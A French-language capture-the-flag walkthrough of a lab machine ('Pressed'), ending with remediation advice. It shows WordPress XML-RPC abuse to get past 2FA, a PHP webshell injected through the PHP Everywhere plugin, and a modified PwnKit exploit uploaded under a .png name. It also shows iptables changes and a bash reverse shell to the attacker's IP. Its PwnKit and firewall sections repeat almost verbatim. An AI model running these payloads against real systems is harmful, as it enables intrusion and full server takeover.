![Cover](cover.png)

### Reconnaissance & Énumération

Ma phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.142

# Scan de scripts et versions sur le port 80
nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.142
```

Le scan révèle un serveur **Apache 2.4.41** sur **Ubuntu** faisant tourner **WordPress 5.9**. Je rajoute `pressed.htb` à mon fichier `/etc/hosts`.

J'utilise ensuite **WPScan** pour une énumération spécifique au CMS. L'outil identifie deux éléments critiques :
1.  L'interface **XML-RPC** est activée (`/xmlrpc.php`).
2.  Un fichier de sauvegarde de configuration est accessible : `wp-config.php.bak`.

```bash
wpscan --url http://pressed.htb --api-token $WPSCAN_API
```

En inspectant `wp-config.php.bak`, je récupère des identifiants de base de données :
*   **DB_USER** : `admin`
*   **DB_PASSWORD** : `uhc-jan-finals-2021`

### Vecteur d'Entrée : XML-RPC & 2FA Bypass

Je tente d'utiliser ces identifiants sur `/wp-login.php`. Le mot de passe de 2021 échoue, mais une simple itération logique sur l'année (`uhc-jan-finals-2022`) me permet de valider la première étape de l'authentification. Cependant, un **2FA (Two-Factor Authentication)** bloque l'accès au **Dashboard**.

Pour contourner cette restriction, je me tourne vers **XML-RPC**. Cette interface permet d'interagir avec **WordPress** via des requêtes **HTTP POST** en **XML**, contournant souvent les protections de l'interface graphique comme le **2FA**.

> **Schéma Mental :**
> Identifiants valides + 2FA (GUI) -> Recherche d'une interface programmable (API/XML-RPC) -> Interaction directe avec les méthodes du CMS -> Bypass de la couche d'authentification multi-facteurs.

Je vérifie les méthodes disponibles :
```bash
curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
```

Parmi les méthodes, `htb.get_flag` me permet de récupérer directement le flag utilisateur, mais mon objectif est d'obtenir une exécution de code.

### Exploitation de PHP Everywhere via XML-RPC

En utilisant la bibliothèque Python `python-wordpress-xmlrpc`, je me connecte en tant qu'**admin** pour inspecter les articles existants.

```python
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import posts

client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
plist = client.call(posts.GetPosts())
print(plist[0].content)
```

L'inspection du contenu révèle l'utilisation du plugin **PHP Everywhere**. Ce plugin permet d'exécuter du code PHP directement à l'intérieur des blocs de contenu via un paramètre `code` encodé en **Base64**.

```html
<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->
```

Je prépare un payload PHP pour injecter un **Webshell** qui n'exécutera mes commandes que si elles proviennent de mon adresse IP (pour éviter le détournement par d'autres utilisateurs).

**Payload PHP :**
```php
<?php 
if ($_SERVER['REMOTE_ADDR'] == '10.10.14.6') {
    system($_REQUEST['cmd']);
}
?>
```

J'encode ce payload en **Base64**, je modifie l'objet `post` via mon script Python et je le renvoie au serveur via la méthode `EditPost`.

```python
mod_post = plist[0]
mod_post.content = '... <!-- wp:php-everywhere-block/php {"code":"[BASE64_PAYLOAD]", "version":"3.0.0"} /--> ...'
client.call(posts.EditPost(mod_post.id, mod_post))
```

### Premier Shell (Webshell)

Le **Firewall** de la machine bloque tout le trafic sortant (**Egress Filtering**), rendant impossible l'obtention d'un **Reverse Shell** classique. Je dois donc interagir avec la machine via mon **Webshell** persistant sur l'URL de l'article.

Pour faciliter l'interaction, je crée un wrapper en **Bash** :

```bash
#!/bin/bash
# webshell.sh
curl -d "cmd=$1" -s 'http://pressed.htb/index.php/2022/01/28/hello-world/' | \
awk '/<\/table>/{flag=1;next}/<p><\/p>/{flag=0}flag' | \
sed 's/&#8211;/--/g' | head -n -3
```

Je vérifie mon accès :
```bash
./webshell.sh 'id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Je dispose désormais d'une **Remote Code Execution (RCE)** stable en tant que `www-data`.

---

### Énumération Post-Exploitation & Analyse des Restrictions

Une fois l'accès **Webshell** établi en tant que `www-data`, ma priorité est de stabiliser l'accès. Cependant, je constate rapidement une restriction majeure : un **Egress Filtering** (filtrage de sortie) agressif. Toutes les tentatives de **Reverse Shell** via `nc`, `bash` ou `python` échouent, et même le protocole **ICMP** (`ping`) est bloqué vers l'extérieur.

#### Vérification de l'environnement
Je commence par énumérer les vecteurs d'escalade locaux classiques. Le système d'exploitation semble être un **Ubuntu 20.04**. Je vérifie la présence du binaire `pkexec` pour une éventuelle exploitation de **PwnKit**.

```bash
# Vérification de la version/date de pkexec
ls -l /usr/bin/pkexec
# Sortie : -rwsr-xr-x 1 root root 31032 Jul 14  2021 /usr/bin/pkexec
```

> **Schéma Mental :** La date de modification (juillet 2021) est antérieure à la divulgation publique de **CVE-2021-4034** (janvier 2022). Puisque le binaire possède le bit **SUID** et n'a pas été patché, la machine est vulnérable à une **Local Privilege Escalation (LPE)** via **PwnKit**.

---

### Escalade de Privilèges : Exploitation de PwnKit (CVE-2021-4034)

L'absence de shell interactif m'oblige à modifier l'exploit **PwnKit** standard. Habituellement, cet exploit invoque `/bin/bash`. Ici, je dois le transformer en un "one-liner" capable d'exécuter une commande spécifique et de retourner le résultat via le **Webshell**.

#### 1. Modification du Payload C
Je modifie la fonction `gconv_init()` dans le code source de l'exploit pour qu'elle exécute mes commandes avec les privilèges **root**.

```c
// pkwner.c (extrait modifié)
void gconv_init() {
  setuid(0); setgid(0);
  seteuid(0); setegid(0);
  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; id; cat /root/root.txt");
  exit(0);
}
```

#### 2. Transfert via XML-RPC
Pour uploader l'exploit sur la machine cible, j'utilise l'interface **XML-RPC** de WordPress, car elle permet de téléverser des fichiers de manière programmatique via la méthode `wp.uploadFile`.

```python
# Script Python pour l'upload via XML-RPC
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import media

client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')

with open('pkwner.sh', 'rb') as f:
    data = {
        'name': 'pkwner.png', # Bypass d'extension
        'bits': f.read(),
        'type': 'image/png'
    }
client.call(media.UploadFile(data))
```

> **Schéma Mental :** Le filtre de WordPress refuse l'extension `.sh`. En renommant le fichier en `.png` tout en conservant le contenu texte (script bash), je contourne la vérification du **MIME Type** côté applicatif. Le serveur stocke le fichier dans `/wp-content/uploads/`, où il reste exécutable via l'interpréteur `bash`.

#### 3. Exécution et Root Flag
J'exécute le script via mon **Webshell** pour déclencher la vulnérabilité **PwnKit**.

```bash
# Commande envoyée via le paramètre ?cmd=
bash /var/www/html/wp-content/uploads/2022/02/pkwner.png
```

---

### Mouvement Latéral & Évasion du Firewall

Bien que j'aie récupéré le **Root Flag**, l'absence de shell interactif limite mes capacités de post-exploitation. Pour obtenir un véritable **Root Shell**, je dois désactiver ou modifier les règles du **Firewall** (iptables) qui bloquent le trafic sortant.

#### Manipulation d'iptables
En tant que **root** (via l'exploit précédent), je peux injecter des règles **iptables** pour autoriser ma machine d'attaque (10.10.14.6).

```bash
# Autoriser le trafic TCP entrant et sortant pour l'IP de l'attaquant
iptables -A OUTPUT -p tcp -d 10.10.14.6 -j ACCEPT
iptables -A INPUT -p tcp -s 10.10.14.6 -j ACCEPT
```

#### Stabilisation du Shell
Une fois les règles appliquées, je peux enfin lancer un **Reverse Shell** classique vers mon listener `nc`.

```bash
# Sur la machine d'attaque
nc -lvnp 4444

# Via le Webshell (en utilisant l'exploit PwnKit pour les droits root)
bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
```

> **Schéma Mental :** L'attaque se décompose en trois phases : 
> 1. **Abus de confiance** (XML-RPC pour l'upload).
> 2. **Élévation de privilèges** (PwnKit via Webshell).
> 3. **Reconfiguration réseau** (Iptables) pour briser l'isolement de la machine et établir une persistance interactive.

---

### Éviction des restrictions et Élévation de Privilèges

Une fois mon accès **webshell** établi en tant que `www-data`, je constate rapidement une isolation réseau sévère. Toutes mes tentatives de **Reverse Shell** échouent, et même un simple `ping` vers mon instance est bloqué. Le serveur semble filtrer tout l'**Outbound Traffic**.

#### Énumération de la vulnérabilité PwnKit
Compte tenu de la date de sortie de la machine et des tendances habituelles, je vérifie la présence de **PwnKit** (**CVE-2021-4034**). Je contrôle les permissions et la date de modification du binaire `pkexec` :

```bash
ls -l /usr/bin/pkexec
# Sortie : -rwsr-xr-x 1 root root 31032 Jul 14 2021 /usr/bin/pkexec
```

Le binaire est **SUID** et n'a pas été mis à jour depuis juillet 2021, ce qui confirme qu'il est vulnérable sur cette version d'Ubuntu.

> Schéma Mental :
> Webshell (www-data) -> Firewall (Bloque Reverse Shell) -> Exploitation locale (PrivEsc) -> Exécution de commande Root via Webshell -> Modification des règles Firewall -> Accès interactif Root.

#### Exploitation de CVE-2021-4034 via XML-RPC
Comme je ne peux pas interagir avec un shell TTY, je dois modifier un exploit **PwnKit** existant pour qu'il exécute des commandes de manière non-interactive. Je modifie la fonction `gconv_init()` dans le code source C de l'exploit pour qu'elle exécute ma commande cible au lieu de `/bin/bash`.

Pour uploader l'exploit, j'utilise l'interface **XML-RPC** de WordPress avec la méthode `wp.uploadFile`. WordPress refusant les fichiers `.sh`, je contourne la restriction en renommant mon script en `pkwner.png`.

```python
# Snippet Python pour l'upload via XML-RPC
from wordpress_xmlrpc.methods import media
with open('pkwner.sh', 'r') as f:
    script = f.read()
data = { 'name': 'pkwner.png', 'bits': script, 'type': 'image/png' }
client.call(media.UploadFile(data))
```

Une fois le fichier uploadé dans `/wp-content/uploads/`, je l'exécute via mon **webshell** :

```bash
./webshell.sh 'bash /var/www/html/wp-content/uploads/2022/02/pkwner.png'
```

L'exploit compile un module partagé malveillant, l'injecte via `pkexec` en manipulant les variables d'environnement (**GCONV_PATH**), et exécute la commande avec les privilèges **root**.

### Beyond Root : Analyse Post-Exploitation

L'analyse du système après l'obtention du flag révèle la raison de l'échec des **Reverse Shells** : une configuration stricte d'**iptables**. Le serveur est configuré pour rejeter tout trafic sortant non explicitement autorisé, une pratique de **Hardening** efficace contre les **Webshells** classiques.

#### Désactivation du Firewall
Pour obtenir un shell interactif stable et sortir de la contrainte du **webshell**, je dois "percer" le firewall en ajoutant des règles autorisant mon IP spécifique :

```bash
# Autoriser le trafic entrant et sortant pour l'IP de l'attaquant
iptables -A OUTPUT -p tcp -d 10.10.14.6 -j ACCEPT
iptables -A INPUT -p tcp -s 10.10.14.6 -j ACCEPT
```

#### Persistence et Analyse
L'utilisation de **PHP Everywhere** comme vecteur d'entrée souligne un risque majeur : l'installation de plugins permettant l'exécution de code (**RCE by design**) au sein d'un CMS. Même avec un **2FA** sur l'interface d'administration, l'activation de **XML-RPC** a permis de contourner cette protection pour modifier le contenu des posts et injecter le **webshell**. 

En environnement de production, la remédiation aurait consisté à :
1. Désactiver totalement **XML-RPC** via `.htaccess`.
2. Supprimer le plugin **PHP Everywhere**.
3. Appliquer les patchs de sécurité Linux pour corriger la vulnérabilité **PwnKit**.
4. Maintenir la politique **Egress Filtering** (bloquant le trafic sortant) tout en surveillant les modifications de règles **iptables**.